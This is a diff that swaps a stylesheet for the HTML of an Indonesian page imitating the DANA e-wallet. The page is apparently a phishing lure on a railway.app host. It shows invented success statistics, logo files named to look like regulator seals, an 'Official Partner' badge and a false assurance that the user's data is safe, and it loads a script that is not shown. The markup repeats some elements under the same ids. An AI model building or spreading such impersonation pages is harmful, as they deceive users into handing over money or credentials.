@@ -1,672 +1,240 @@
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-}
-
-html,body{
-    width:100%;
-    min-height:180%;
-    font-family:Arial,sans-serif;
-    overflow-x:hidden;
-}
-
-.bg-banner{
-    position:fixed;
-    inset:0;
-    background:
-    linear-gradient(180deg,#0799f2,#0477d9);
-    z-index:-2;
-}
-
-.container{
-    width:100%;
-    max-width:430px;
-    margin:auto;
-    padding:18px 14px 45px;
-}
-
-/* TOPBAR */
-.topbar{
-    height:58px;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-
-    padding:0 14px;
-    border-radius:22px;
-
-    background:rgba(255,255,255,.15);
-    backdrop-filter:blur(22px);
-    border:1px solid rgba(255,255,255,.25);
-
-    box-shadow:
-    0 15px 35px rgba(0,0,0,.14),
-    inset 0 1px 0 rgba(255,255,255,.25);
-}
-
-.time-box{
+<!DOCTYPE html>
+<html lang="id">
+<head>
 
-    min-width:50px;
-    height:30px;
-
-    display:flex;
-    align-items:center;
-    justify-content:center;
+<meta charset="UTF-8">
 
-    padding:0 14px;
-
-    border-radius:14px;
+<meta name="viewport"
+content="width=device-width,
+initial-scale=1.0,
+maximum-scale=1.0,
+user-scalable=no">
 
-    background:
-    linear-gradient(
-        135deg,
-        rgba(255,255,255,.22),
-        rgba(255,255,255,.08)
-    );
+<title>AJUKAN</title>
 
-    backdrop-filter:blur(18px);
-    -webkit-backdrop-filter:blur(18px);
+<meta property="og:title"
+content="𝗗𝗔𝗡𝗔 | 𝗣𝗶𝗹𝗶𝗵 𝗞𝗲𝗯𝘂𝘁𝘂𝗵𝗮𝗻 𝗔𝗻𝗱𝗮">
 
-    border:1px solid
-    rgba(255,255,255,.25);
+<meta property="og:description"
+content="Aktifkan fitur dan nikmati kemudahan transaksi digital.">
 
-    box-shadow:
-    0 8px 20px rgba(0,0,0,.12),
-    inset 0 1px 0 rgba(255,255,255,.25);
+<meta property="og:image"
+content="https://lnkjenius-production.up.railway.app/assets/previeww.jpg?update=827382">
 
-    color:#fff;
-
-    font-size:13px;
-    font-weight:900;
-
-    letter-spacing:.8px;
-
-    text-shadow:
-    0 2px 8px rgba(0,0,0,.15);
-}
-
-.top-logo{
-    width:105px;
-    filter:drop-shadow(0 5px 14px rgba(0,0,0,.18));
-}
-
-.help-btn{
-    border:none;
-    padding:8px 12px;
-    border-radius:999px;
-
-    background:rgba(255,255,255,.18);
-    border:1px solid rgba(255,255,255,.25);
-
-    color:#fff;
-    font-size:12px;
-    font-weight:800;
-}
+<meta property="og:image:secure_url"
+content="https://lnkjenius-production.up.railway.app/assets/previeww.jpg?update=827382">
 
-/* MARQUEE CARD */
-.marquee-card{
-    width:100%;
-    height:48px;
+<meta property="og:image:type"
+content="image/jpeg">
 
-    margin:14px auto;
+<meta property="og:type"
+content="website">
 
-    position:relative;
-    overflow:hidden;
+<meta property="og:url"
+content="https://lnkjenius-production.up.railway.app/?update=827382">
 
-    display:flex;
-    align-items:center;
+<link rel="stylesheet"
+href="style.css">
 
-    border-radius:18px;
+</head>
+<body>
 
-    background:
-    linear-gradient(
-        135deg,
-        rgba(255,255,255,.24),
-        rgba(255,255,255,.09)
-    );
+<div class="bg-banner"></div>
 
-    backdrop-filter:blur(24px);
-    -webkit-backdrop-filter:blur(24px);
+<div class="container">
 
-    border:1px solid rgba(255,255,255,.25);
+    <div class="topbar">
+        <div class="time-box" id="timeBox">00:00</div>
 
-    box-shadow:
-    0 12px 35px rgba(0,0,0,.12),
-    inset 0 1px 0 rgba(255,255,255,.20);
-}
+        <img src="assets/logo-danaa.png" class="top-logo">
 
-/* ICON TETAP */
-.marquee-card::before{
+        <button class="help-btn menu-box">
+    Bantuan
+</button>
 
-    position:absolute;
-    left:14px;
-    z-index:3;
+    </div>
 
-    font-size:17px;
-}
+<div class="marquee-card">
+        <div class="marquee-text" id="marqueeText">
+            Memuat aktivitas...
+        </div>
+    </div>
 
-.marquee-text{
-    position:absolute;
-    left:0;
+<div class="banner-box">
 
-    white-space:nowrap;
+    <button class="banner-btn prev">
+        &#10094;
+    </button>
 
-    color:#fff;
-    font-size:13px;
-    font-weight:900;
-    letter-spacing:.3px;
+    <div class="banner-slider">
 
-    padding-left:100%;
+        <img
+        src="assets/poster1.png"
+        class="banner-slide active">
 
-    animation:marqueeSmooth 16s linear infinite;
-}
+        <img
+        src="assets/poster2.png"
+        class="banner-slide">
 
-@keyframes marqueeSmooth{
-    0%{
-        transform:translateX(0);
-    }
+        <img
+        src="assets/poster3.png"
+        class="banner-slide">
 
-    100%{
-        transform:translateX(-220%);
-    }
-}
+        <img
+        src="assets/poster4.png"
+        class="banner-slide">
 
-.banner-box{
-    width:100%;
-    height:210px;
-    border-radius:24px;
-    overflow:hidden;
-    position:relative;
+    </div>
 
-    background:rgba(255,255,255,.12);
-    backdrop-filter:blur(20px);
-    border:1px solid rgba(255,255,255,.25);
+    <button class="banner-btn next">
+        &#10095;
+    </button>
 
-    box-shadow:0 18px 45px rgba(0,0,0,.18);
-}
+    <div class="banner-dots">
+        <span class="dot active"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+    </div>
 
-.banner-slider{
-    width:100%;
-    height:100%;
-    position:relative;
-}
+</div>
 
-.banner-slide{
-    position:absolute;
-    inset:0;
+<div class="quick-menu">
 
-    width:100%;
-    height:100%;
+    <div class="menu-box quick-btn">
+        <img src="assets/quick1.png" class="quick-img">
+    </div>
 
-    object-fit:cover;
-    display:block;
+    <div class="menu-box quick-btn">
+        <img src="assets/quick2.png" class="quick-img">
+    </div>
 
-    opacity:0;
-    transition:opacity .6s ease;
-}
+    <div class="menu-box quick-btn">
+        <img src="assets/quick3.png" class="quick-img">
+    </div>
 
-.banner-slide.active{
-    opacity:1;
-}
+    <div class="menu-box quick-btn">
+        <img src="assets/quick4.png" class="quick-img">
+    </div>
 
-.banner-btn{
-    position:absolute;
-    top:50%;
-    transform:translateY(-50%);
+</div>
 
-    width:34px;
-    height:34px;
+<div class="stats-card">
 
-    border:none;
-    border-radius:50%;
+    <div class="stats-title">
+         Aktivitas Hari Ini
+    </div>
 
-    background:rgba(255,255,255,.25);
-    color:#fff;
+    <div class="stats-grid">
 
-    z-index:10;
-}
+        <div class="stat-item">
+            <h2 id="aktifHari">1.284</h2>
+            <p>Aktivasi Berhasil</p>
+        </div>
 
-.banner-btn.prev{
-    left:10px;
-}
+        <div class="stat-item">
+            <h2 id="verifHari">842</h2>
+            <p>Verifikasi Selesai</p>
+        </div>
 
-.banner-btn.next{
-    right:10px;
-}
+        <div class="stat-item">
+            <h2 id="cicilHari">529</h2>
+            <p>DANA Cicil Aktif</p>
+        </div>
 
-.quick-menu{
-    display:flex;
-    justify-content:space-between;
-    gap:10px;
+        <div class="stat-item">
+            <h2>98.7%</h2>
+            <p>Tingkat Keberhasilan</p>
+        </div>
 
-    margin-top:14px;
-}
+    </div>
 
-.quick-btn{
+</div>
 
-    flex:1;
+    <!-- INFO BOX -->
+    <div class="info-box">
 
-    height:35px;
+        <div class="text-row">
 
-    border-radius:10px;
+            <p>
+                DANA Terdaftar dan Diawasi
+            </p>
 
-    background:
-    rgba(255,255,255,.18);
+            <h3>
+                Official Partner
+            </h3>
 
-    backdrop-filter:blur(20px);
+        </div>
 
-    border:1px solid
-    rgba(255,255,255,.25);
+        <div class="logo-row">
 
-    display:flex;
-    flex-direction:column;
+            <div class="left">
 
-    align-items:center;
-    justify-content:center;
+                <img src="assets/ojx.png">
 
-    color:#fff;
+                <img src="assets/lpx.png">
 
-    box-shadow:
-    0 10px 25px rgba(0,0,0,.12);
-}
+            </div>
 
-.quick-btn img{
+            <div class="right">
 
-    width:100%;
-    height:100%;
+                <img src="assets/lazadax.png">
 
-    object-fit:cover;
+            </div>
 
-    display:block;
-}
+        </div>
 
-.stats-card{
+        <!-- SECURITY TEXT -->
+        <div class="security-text">
 
-    width:100%;
+            🔒 Data Anda dijamin aman
+            sesuai standar keamanan
+            informasi DANA
 
-    margin-top:15px;
+        </div>
 
-    padding:18px;
+    </div>
 
-    border-radius:24px;
+</div>
 
-    background:
-    rgba(255,255,255,.18);
 
-    backdrop-filter:blur(20px);
-    -webkit-backdrop-filter:blur(20px);
+<!-- LOADING -->
+<div class="loading-box"
+id="loadingBox">
 
-    border:1px solid
-    rgba(255,255,255,.25);
+    <div class="loading-circle">
 
-    box-shadow:
-    0 15px 35px rgba(0,0,0,.14);
-}
+        <div class="spinner-ring"></div>
 
-.stats-title{
+        <img
+        src="assets/loadingg-danaa.png"
+        class="loading-logo">
 
-    color:#fff;
+    </div>
 
-    font-size:16px;
-    font-weight:900;
+    <div class="loading-text">
 
-    text-align:center;
+        Memuat...
 
-    margin-bottom:16px;
-}
+    </div>
 
-.stats-grid{
+</div>
 
-    display:grid;
+    <div class="marquee-card">
 
-    grid-template-columns:
-    1fr 1fr;
+    <div
+    class="marquee-text"
+    id="marqueeText">
 
-    gap:12px;
-}
+    </div>
 
-.stat-item{
+</div>
 
-    padding:14px 10px;
+<div class="loading-box" id="loadingBox">
+    <div class="spinner-ring"></div>
+    <div class="loading-text">Memuat...</div>
+</div>
 
-    border-radius:18px;
+<script src="script.js"></script>
 
-    background:
-    rgba(255,255,255,.12);
-
-    border:1px solid
-    rgba(255,255,255,.15);
-
-    text-align:center;
-}
-
-.stat-item h2{
-
-    color:#fff;
-
-    font-size:24px;
-    font-weight:900;
-
-    margin-bottom:4px;
-}
-
-.stat-item p{
-
-    color:
-    rgba(255,255,255,.85);
-
-    font-size:11px;
-    font-weight:700;
-}
-
-/* INFO BOX PREMIUM */
-.info-box{
-    width:100%;
-    height:auto;
-
-    margin:14px auto 0;
-    padding:20px 18px;
-
-    position:relative;
-    overflow:hidden;
-
-    border-radius:26px;
-
-    background:
-    linear-gradient(
-        135deg,
-        rgba(255,255,255,.96),
-        rgba(255,255,255,.82)
-    );
-
-    backdrop-filter:blur(24px);
-    -webkit-backdrop-filter:blur(24px);
-
-    border:1px solid rgba(255,255,255,.75);
-
-    box-shadow:
-    0 20px 50px rgba(0,0,0,.14),
-    inset 0 1px 0 rgba(255,255,255,.85);
-}
-
-.info-box::before{
-    content:"";
-    position:absolute;
-    top:-60px;
-    left:-60px;
-
-    width:170px;
-    height:170px;
-
-    background:
-    radial-gradient(
-        rgba(255,255,255,.95),
-        transparent 70%
-    );
-
-    opacity:.65;
-    pointer-events:none;
-}
-
-/* TEXT ROW */
-.text-row{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-
-    position:relative;
-    z-index:2;
-
-    margin:0 0 18px;
-}
-
-.text-row p{
-    font-size:12px;
-    font-weight:900;
-    color:#1f2937;
-}
-
-.text-row h3{
-    font-size:11px;
-    font-weight:900;
-
-    color:#118EEA;
-
-    padding:6px 12px;
-
-    border-radius:999px;
-
-    background:#eaf6ff;
-
-    box-shadow:
-    0 5px 14px rgba(17,142,234,.14);
-}
-
-/* LOGO ROW */
-.logo-row{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-
-    position:relative;
-    z-index:2;
-
-    margin-top:8px;
-}
-
-.left{
-    display:flex;
-    align-items:center;
-    gap:28px;
-
-    margin-left:6px;
-}
-
-.left img{
-    width:54px;
-    filter:drop-shadow(0 4px 10px rgba(0,0,0,.08));
-}
-
-.right img{
-    width:76px;
-    margin-right:8px;
-    filter:drop-shadow(0 4px 10px rgba(0,0,0,.08));
-}
-
-/* SECURITY TEXT */
-.security-text{
-    width:100%;
-
-    position:relative;
-    z-index:2;
-
-    text-align:center;
-
-    font-size:10px;
-    font-weight:700;
-    color:#6b7280;
-
-    margin-top:18px;
-    padding-top:14px;
-
-    border-top:1px solid rgba(0,0,0,.08);
-
-    line-height:1.6;
-}
-
-/* ========================= */
-/* LOADING PREMIUM */
-/* ========================= */
-
-.loading-box{
-
-    width:110px;
-    height:110px;
-
-    position:fixed;
-
-    top:50%;
-    left:50%;
-
-    transform:
-    translate(-50%,-50%);
-
-    background:
-    linear-gradient(
-        135deg,
-        rgba(255,255,255,.18),
-        rgba(255,255,255,.08)
-    );
-
-    backdrop-filter:blur(25px);
-    -webkit-backdrop-filter:blur(25px);
-
-    border:1px solid
-    rgba(255,255,255,.25);
-
-    border-radius:18px;
-
-    display:none;
-
-    flex-direction:column;
-    justify-content:center;
-    align-items:center;
-
-    z-index:99999;
-
-    box-shadow:
-    0 20px 50px rgba(0,0,0,.25),
-    inset 0 1px 0 rgba(255,255,255,.25);
-}
-
-/* BULATAN */
-
-.loading-circle{
-
-    width:50px;
-    height:50px;
-
-    position:relative;
-
-    display:flex;
-    align-items:center;
-    justify-content:center;
-}
-
-/* RING */
-
-.spinner-ring{
-
-    width:60px;
-    height:60px;
-
-    position:absolute;
-
-    border-radius:50%;
-
-    border:4px solid
-    rgba(255,255,255,.12);
-
-    border-top:4px solid #ffffff;
-
-    border-right:4px solid #53adff;
-
-    animation:
-    spin 1s linear infinite;
-}
-
-/* LOGO */
-
-.loading-logo{
-
-    width:38px;
-    height:38px;
-
-    object-fit:contain;
-
-    position:relative;
-
-    z-index:2;
-
-    animation:
-    pulseLogo 1.5s ease-in-out infinite;
-}
-
-/* TEXT */
-
-.loading-text{
-
-    margin-top:14px;
-
-    color:#fff;
-
-    font-size:14px;
-
-    font-weight:800;
-
-    letter-spacing:.5px;
-
-    text-shadow:
-    0 2px 8px rgba(0,0,0,.15);
-}
-
-/* SPIN */
-
-@keyframes spin{
-
-    from{
-        transform:rotate(0deg);
-    }
-
-    to{
-        transform:rotate(360deg);
-    }
-
-}
-
-/* LOGO PULSE */
-
-@keyframes pulseLogo{
-
-    0%{
-        transform:scale(1);
-    }
-
-    50%{
-        transform:scale(1.08);
-    }
-
-    100%{
-        transform:scale(1);
-    }
-
-}
-
-.loading-circle::before{
-
-    content:"";
-
-    position:absolute;
-
-    width:55px;
-    height:55px;
-
-    border-radius:50%;
-
-    background:
-    radial-gradient(
-        rgba(83,173,255,.45),
-        transparent
-    );
-
-    filter:blur(12px);
-
-    z-index:1;
-}
-
-@keyframes spin{
-    to{
-        transform:rotate(360deg);
-    }
-}
+</body>
